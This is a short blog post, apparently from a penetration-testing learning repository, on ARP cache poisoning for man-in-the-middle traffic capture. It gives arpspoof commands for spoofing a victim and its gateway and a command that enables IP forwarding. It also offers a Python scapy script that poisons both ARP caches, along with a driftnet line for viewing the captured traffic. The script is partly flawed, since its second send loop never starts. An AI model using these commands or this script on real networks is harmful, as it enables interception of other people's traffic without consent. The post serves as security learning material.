---
title: 'Penetration Testing : 流量捕获之APR缓存攻击'
date: 2019-11-25 22:24:22
tags: [Penetration Testing,Kali Linux,Python]
---


### intro
```python
# author: huangyuhui
# date: november 25,2019
# envir: 5.2.0-kali2
# desc: the detailed steps and the simple codes about the dns attack
# repo address: https://github.com/yubuntu0109/penetration-testing-learning
```


### ARP MitM attack with the tool of arpspoof
```python
'''
>> scan the targete ip
nmap -sP 192.168.xxx.*

>> spoofing the target host: disguised as the gateway,the real identity is attacker
arpspoof -i wlan0 -t 192.168.xxx.xxx(targetIP) 192.168.xxx.xxx(gateway)

>> spoofing the gateway: disguised as the targetIP, the real identity is attacker
arpspoof -i wlan0 -t 192.168.xxx.xxx(gatewayIP) 192.168.xxx.xxx(targetIP)

>> traffic forwarding: forward the data package to the gateway
echo 1 >/proc/sys/net/ipv4/ip_forward
'''
```


### ARP Man-in-the-middle attack with python
```python
import sys
import time
import optparse
import subprocess
from scapy.all import sendp, ARP, Ether


def main():

	''' init the parameters '''
	parser = optparse.OptionParser("usage: %prog -v <victimIP> -g <gatewayIP>")
	parser.add_option('-v', dest='victimIP', type='string', help='the specified targate ip')
	parser.add_option('-g', dest='gatewayIP', type='string', help='the specified gateway ip')
	(options, args) = parser.parse_args()
	if (options.victimIP == None) | (options.gatewayIP == None):
		print parser.usage
		exit(0)
	else:
		victimIP = options.victimIP
		gatewayIP = options.gatewayIP

	''' MitM attack '''
	try:
		attackGateway = Ether()/ARP(psrc=victimIP, pdst=gatewayIP)
		attackTarget = Ether()/ARP(psrc=gatewayIP, pdst=victimIP)
		print '[ok]:MitM attack is running'
		sendp(attackGateway, inter=1, loop=1)  # send the data package to the target host circularly
		sendp(attackTarget, inter=1, loop=1)  # send the data package to the gateway circularly
	except:  # except optparser.TypeError as e:
		pass  # print 'error:please enter the correct parameters'

# traffic forwarding
n = subprocess.call('echo 1 >> /proc/sys/net/ipv4/ip_forward', shell=True)
print(("[x]:the traffic forwarding hasn't opened","[ok]:the traffic forwarding has opened")[n==0])


# run: python arpspoofing.py -v <victim ip> -g <gateway ip>
# test: see the effects by the tool of driftnet : driftnet -v -b -i wlan0(interface name)
if __name__ == '__main__':
	main()
```


### recommended tools
* kickthemout : https://github.com/k4m4/kickthemout
* arpspoof : https://github.com/byt3bl33d3r/arpspoof
* Python ARP Poisoner : https://github.com/Sha2ow-M4st3r/PAPoisoner
